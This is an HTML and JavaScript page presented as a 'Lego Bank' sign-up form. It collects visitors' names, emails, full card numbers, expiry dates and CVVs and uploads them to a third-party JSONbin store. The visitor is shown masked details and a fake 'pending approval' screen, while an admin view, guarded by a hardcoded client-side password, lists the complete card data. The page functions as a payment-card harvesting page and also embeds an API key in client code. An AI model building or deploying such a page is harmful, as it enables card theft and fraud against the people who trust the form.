<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lego Bank</title>
    <style>
        /* [Previous CSS styles remain exactly the same] */
    </style>
</head>
<body>
    <!-- [Previous HTML structure remains the same] -->

    <script>
        // Cloud storage configuration
        const BIN_ID = 'YOUR_JSONBIN_IO_BIN_ID'; // Replace with your actual bin ID
        const API_KEY = 'YOUR_JSONBIN_IO_API_KEY'; // Replace with your actual API key
        const ADMIN_PASSWORD = "legobank123"; // Change this in production
        
        // DOM Elements
        const storeFront = document.getElementById('store-front');
        const approvalPage = document.getElementById('approval-page');
        const adminPanel = document.getElementById('admin-panel');
        const memberAccessBtn = document.getElementById('member-access-btn');
        
        // Format card number input
        document.getElementById('card-number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
            }
            e.target.value = value;
        });
        
        // Format expiry date input
        document.getElementById('expiry-date').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Cloud storage functions
        async function loadData() {
            try {
                const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                    headers: {
                        'X-Master-Key': API_KEY
                    }
                });
                const data = await response.json();
                return data.record || [];
            } catch (error) {
                console.error("Error loading data:", error);
                return [];
            }
        }
        
        async function saveData(users) {
            try {
                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Master-Key': API_KEY
                    },
                    body: JSON.stringify(users)
                });
            } catch (error) {
                console.error("Error saving data:", error);
            }
        }
        
        // Toggle admin view with password
        async function toggleAdmin() {
            if (adminPanel.classList.contains('hidden')) {
                const password = prompt("Enter admin password:");
                if (password === ADMIN_PASSWORD) {
                    storeFront.classList.add('hidden');
                    approvalPage.classList.add('hidden');
                    adminPanel.classList.remove('hidden');
                    const users = await loadData();
                    renderAdminTable(users);
                } else {
                    alert("Incorrect password");
                }
            } else {
                storeFront.classList.remove('hidden');
                approvalPage.classList.add('hidden');
                adminPanel.classList.add('hidden');
            }
        }
        
        // Return to store from approval page
        function returnToStore() {
            storeFront.classList.remove('hidden');
            approvalPage.classList.add('hidden');
            adminPanel.classList.add('hidden');
            document.getElementById('registration-form').reset();
        }
        
        // Form submission
        async function registerUser(event) {
            event.preventDefault();
            
            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;
            
            const user = {
                id: 'LB-' + Date.now(),
                firstName: document.getElementById('first-name').value,
                lastName: document.getElementById('last-name').value,
                email: document.getElementById('email').value,
                cardNumber: cardNumber,
                expiryDate: expiryDate,
                cvv: cvv,
                status: 'pending',
                date: new Date().toLocaleString()
            };
            
            const users = await loadData();
            users.push(user);
            await saveData(users);
            showApprovalPage(user);
        }
        
        // Show approval page
        function showApprovalPage(user) {
            storeFront.classList.add('hidden');
            approvalPage.classList.remove('hidden');
            adminPanel.classList.add('hidden');
            
            // Mask card details for user view
            const maskedCard = '•••• •••• •••• ' + user.cardNumber.slice(-4);
            const maskedExpiry = '••/••';
            const maskedCvv = '•••';
            
            document.getElementById('approval-details').innerHTML = `
                <p><strong>Application ID:</strong> ${user.id}</p>
                <p><strong>Name:</strong> ${user.firstName} ${user.lastName}</p>
                <p><strong>Email:</strong> ${user.email}</p>
                <p><strong>Card Number:</strong> ${maskedCard}</p>
                <p><strong>Expiry Date:</strong> ${maskedExpiry}</p>
                <p><strong>CVV:</strong> ${maskedCvv}</p>
                <p><strong>Status:</strong> Pending Approval</p>
            `;
            
            // Countdown timer
            let seconds = 10;
            const timer = setInterval(() => {
                seconds--;
                document.getElementById('approval-timer').textContent = `Redirecting in ${seconds} seconds...`;
                
                if (seconds <= 0) {
                    clearInterval(timer);
                    returnToStore();
                }
            }, 1000);
        }
        
        // Render admin table
        function renderAdminTable(users) {
            const table = document.getElementById('admin-table');
            table.innerHTML = '';
            
            users.forEach(user => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${user.id}</td>
                    <td>${user.firstName} ${user.lastName}</td>
                    <td>${user.email}</td>
                    <td class="card-masked">${formatCardNumber(user.cardNumber)}</td>
                    <td>${user.expiryDate}</td>
                    <td>${user.cvv}</td>
                    <td>${user.date}</td>
                    <td>${user.status}</td>
                    <td>
                        ${user.status === 'pending' ? 
                            `<button class="action-btn approve-btn" onclick="updateStatus('${user.id}', 'approved')">Approve</button>
                             <button class="action-btn decline-btn" onclick="updateStatus('${user.id}', 'declined')">Decline</button>` : 
                            ''}
                        <button class="action-btn delete-btn" onclick="deleteUser('${user.id}')">Delete</button>
                    </td>
                `;
                table.appendChild(row);
            });
        }
        
        // Format card number for display
        function formatCardNumber(number) {
            if (!number) return '';
            const cleaned = number.replace(/\D/g, '');
            const parts = [];
            for (let i = 0; i < cleaned.length; i += 4) {
                parts.push(cleaned.substr(i, 4));
            }
            return parts.join(' ');
        }
        
        // Update user status
        async function updateStatus(userId, status) {
            const users = await loadData();
            const user = users.find(u => u.id === userId);
            if (user) {
                user.status = status;
                user.date = new Date().toLocaleString();
                await saveData(users);
                renderAdminTable(users);
            }
        }
        
        // Delete user
        async function deleteUser(userId) {
            if (confirm("Delete this user permanently?")) {
                const users = await loadData();
                const updatedUsers = users.filter(u => u.id !== userId);
                await saveData(updatedUsers);
                renderAdminTable(updatedUsers);
            }
        }
        
        // Initialize with sample data if empty
        async function initialize() {
            const users = await loadData();
            if (users.length === 0) {
                const sampleData = [
                    {
                        id: 'LB-1001',
                        firstName: 'Admin',
                        lastName: 'User',
                        email: 'admin@example.com',
                        cardNumber: '4111111111111111',
                        expiryDate: '12/25',
                        cvv: '123',
                        status: 'approved',
                        date: new Date().toLocaleString()
                    }
                ];
                await saveData(sampleData);
            }
        }
        
        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', initialize);
    </script>
</body>
</html>
